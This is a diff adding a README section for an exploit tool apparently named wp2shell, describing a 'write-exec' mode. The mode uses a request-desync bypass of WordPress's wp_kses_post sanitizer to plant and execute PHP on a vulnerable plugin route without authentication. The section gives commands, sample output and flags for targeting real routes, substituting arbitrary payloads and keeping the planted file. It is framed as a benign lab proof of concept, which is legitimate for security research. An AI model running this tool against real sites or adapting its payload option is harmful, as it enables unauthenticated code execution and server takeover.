@@ -88,6 +88,44 @@ including credential hashes. Treat output as sensitive.
 
 ---
 
+## 3b. `write-exec` — prove unauthenticated code execution
+
+Where `sqli` proves *read*, `write-exec` proves *write + execute*. It uses the
+desync's sanitization bypass (primitive P3) to write a **benign** PHP file to a
+vulnerable plugin write route, then fetches it to show the server runs it. The
+default payload is inert (`<?php echo 6*7 . "-wp2shell-exec-poc"; ?>` → prints
+`42-wp2shell-exec-poc`) — no shell, no input handling, no system calls.
+
+It needs a **vulnerable write route**. The bundled `lab/acme-templates.php` models
+the common anti-pattern (a public route that trusts the args-schema sanitizer and
+writes the attacker-supplied filename). Install it on your test instance first:
+
+```bash
+cp lab/acme-templates.php /path/to/wordpress/wp-content/mu-plugins/
+# then:
+wp2shell write-exec http://TARGET/
+```
+```
+[+] wrote 45 bytes of raw PHP to wp-content/uploads/acme-templates/wp2shell_<hex>.php
+    (a DIRECT call would have had its <?php stripped by wp_kses_post; the desync bypassed it)
+[*] GET http://TARGET/wp-content/uploads/acme-templates/wp2shell_<hex>.php -> HTTP 200
+[+] server EXECUTED the PHP -> 42-wp2shell-exec-poc
+    => unauthenticated code execution confirmed (write + execute, no auth).
+[*] cleaned up: overwrote the planted file with an inert stub.
+```
+
+Why it's the desync and not just the plugin: a **direct** call to the route has its
+`content` run through `wp_kses_post`, which strips `<?php`; the desync skips that
+sanitizer, so the raw PHP survives to disk. If the server returns the PHP **source**
+instead of `42-...`, the host denies PHP execution under `uploads/` — a good
+hardening that blocks this final step.
+
+Point it at a real vulnerable route with `--route/--name-field/--content-field`,
+change the (benign) code with `--payload`, or keep the planted file with `--keep`
+(it is otherwise overwritten with an inert stub afterward).
+
+---
+
 ## 4. `probe` / `seat` — the raw desync primitive
 
 Confirm the desync, or drive it directly for research:
